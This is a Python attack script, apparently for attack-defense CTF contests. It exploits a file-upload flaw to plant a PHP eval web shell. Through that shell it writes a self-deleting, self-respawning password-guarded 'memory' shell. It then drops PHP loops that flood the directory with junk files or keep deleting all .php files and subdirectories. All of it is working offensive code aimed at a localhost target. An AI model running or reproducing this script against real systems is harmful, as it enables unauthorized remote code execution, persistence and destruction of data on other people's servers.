#!/usr/bin/python3
# -*- coding:utf-8 -*-

import requests, re, base64, time, random, string, hashlib
import pysnooper
from io import BytesIO
from urllib import parse


# 配置信息
config = {
    'debug': True,
    'proxies': {
        'http':'http://127.0.0.1:8080',
        'https':'https://127.0.0.1:8080'
        },
    'shell': '',
    'shellpass':'',
}

# 检测shell存活
# @pysnooper.snoop("debug.log")
# @pysnooper.snoop()
def check_alive(url, mode = 0):
    print("check_alive function working".center(80,"-"))
    try:
        # 0=> 简单探测返回200即存在 1是特殊字符匹配探测
        if mode == 0:
            try:
                code = requests.head(url, timeout=2).status_code
                if code == 200:
                    return True
                else:
                    return False
            except:
                pass
        if mode == 1:
            try:
                html = requests.get(url, timeout=2).text
                if "202cb962ac59075b964b07152d234b70" in html:
                    return True
                else:
                    return False
            except:
                pass
    except Exception as e:
        print("[-]check_alive Exception Fail!")


# 上传漏洞利用
# @pysnooper.snoop("debug.log")
# @pysnooper.snoop()
def upload_vul(url):
    print("upload_vul function working".center(80,"-"))
    code = """<?php var_dump(md5("123"));eval(@$_POST['xq17']);?>"""
    files = {
        "file": ('shell.php',BytesIO(code.encode()))
    }
    try:
        if config['debug']:
            res = requests.post(url, files=files, timeout=5, proxies=config['proxies'])
        else:
            res = requests.post(url, files=files, timeout=5)
        text= res.text
        # shell地址的正则
        pattern = re.compile("[\.](/(.*).php)")
        shell_url = pattern.search(text).group(1)
        if shell_url  is not None:
            print("[+]upload_vul Success! Get Shell:{url}".format(url=shell_url))
        else:
            print("[-]upload_vul Fail! ")
        return shell_url
    except Exception as e:
        print("[-]upload_vul Exception Fail! ")

# 写入md5内存php马
# @pysnooper.snoop("debug.log")
# @pysnooper.snoop()
def  memeory_shell(shell, shellpass):
    print("memeory_shell function working".center(80,"-"))
    # 内存马文件名
    filename = "." + hashlib.md5(str(time.time()).encode()).hexdigest() + ".php"
    # 内存马密码 随机8位密码
    password = "".join(random.sample(string.ascii_letters + string.digits, 8))
    php_code = """<?php
        ignore_user_abort(true);
        set_time_limit(0);
        unlink(__FILE__);
        $file = '{filename}';
        $code = '<?php if(substr(md5(@$_REQUEST["k"]),25)=="{submd5}"){{@eval($_POST[a]);}} ?>';
        while (1){{
            is_dir($file)?rmdir($file):file_put_contents($file,$code);
            usleep(1);
        }}
        ?>
    """.format(filename=filename, submd5=hashlib.md5(password.encode()).hexdigest()[25:])
    try:
        evil_body = {
            shellpass:"file_put_contents({filename},base64_decode({code}));var_dump('ok');".format(filename=filename.encode(), code=base64.b64encode(php_code.encode()))
        }
        res = requests.post(shell,data=evil_body, timeout=5)
        if 'ok' in res.text:
            parse_shell = parse.urlparse(shell)
            # 获取当前相对路径
            mememory_url =  parse_shell.scheme + "://" + (parse_shell.netloc + "/".join(parse_shell.path.split('/')[:-1]) + "/" +filename).replace("//", "/")
            # 自定义shell路径
            #  mememory_url =
            # print(mememory_url)
            # 返回获取的phpshell地址,这里需要根据实际来调整
            print("[+]memeory_shell Success! mememory shell:{}".format(mememory_url))
            # 写入到 shell.txt
            with open("shell.txt", "a+") as f:
                f.write(mememory_url + "-" +password + "\n")
            return mememory_url
        else:
            print("[-]memeory_shell Fail! ")
            exit(0)
    except Exception as e:
        print("[-]memeory_shell Exception! ")



# 干扰和批量删除文件
# @pysnooper.snoop("debug.log")
# @pysnooper.snoop()
def dos_rm(shell, shellpass):
    dos_code = """
            <?php
            ignore_user_abort(true);
            set_time_limit(0);
            unlink(__FILE__);
            $base64 = "SGVsbG8sIGhha2NlciwgMzYwdGVhbQ==";
            while (True){
                file_put_contents(mt_rand().".".md5(mt_rand()),$base64);
                usleep(10);
            }
            ?>
    """
    rm_code = """
            <?
            ignore_user_abort(true);
            set_time_limit(0);
            unlink(__FILE__);
            while (True){
                array_map('unlink', array_filter(glob('./*.php*'), 'is_file'));
                array_map('rmdir', array_filter(glob('./*'), 'is_dir'));
            }
            ?>
    """
    # 这里按需要选择需要写入的代码
    # code = [dos_code]
    code = [rm_code]
    # code = [dos_code, rm_code]
    for _ in code:
        filename = "." + hashlib.md5(str(time.time()).encode()).hexdigest() + ".php"
        try:
            evil_body = {
                shellpass:"file_put_contents({filename},base64_decode({code}));var_dump('ok');".format(filename=filename.encode(), code=base64.b64encode(_.encode()))
            }
            res = requests.post(shell,data=evil_body)
            if 'ok' in res.text:
                parse_shell = parse.urlparse(shell)
                # 获取当前相对路径
                url =  parse_shell.scheme + "://" + (parse_shell.netloc + "/".join(parse_shell.path.split('/')[:-1]) + "/" +filename).replace("//", "/")
                # 开始触发脚本
                check_alive(url)
                return True
            else:
                print("[+]dos_rm Fail! ")
                exit(0)
        except Exception as e:
            print("[+]dos_rm Exception! ")


# 获取shell
# @pysnooper.snoop("debug.log")
# @pysnooper.snoop()
def get_shell():
    print("get_shell function working".center(80,"-"))
    # 上传漏洞url
    url = "http://127.0.0.1:8302/upload.php"
    shell = "http://127.0.0.1:8302/" + upload_vul(url)
    # 检测shell 存活性
    if check_alive(shell):
        print("[+]check_alive Success! shell is aliving...")
        return shell
    else:
        print("[-]check_alive Fail! shell not exised! ")
        exit(0)

# @pysnooper.snoop("debug.log")
# @pysnooper.snoop()
def main():
    print("main function working".center(80,"-"))
    # 1.最基础的步骤是要获得一个简单的shell权限
    shell = config['shell'] if config['shell'] else get_shell()
    shellpass = config['shellpass'] if config['shellpass'] else 'xq17'
    # 2.利用shell 写入内存马
    mshell = memeory_shell(shell, shellpass)
    # 检测内存马是否还可以访问
    if check_alive(mshell, 0):
        print("[+] main>check_alive Success! meshell has runned!")
    else:
        print("[-] main>check_alive Fail!")
    # 3.利用shell写入干扰和批量删除文件
    result = dos_rm(shell,shellpass)
    if result:
        print("[+] main>dos_rm Success! dor_rm shell has runned!")
    else:
        print("[-] main>dos_rm Fail!")


if __name__ == '__main__':
    main()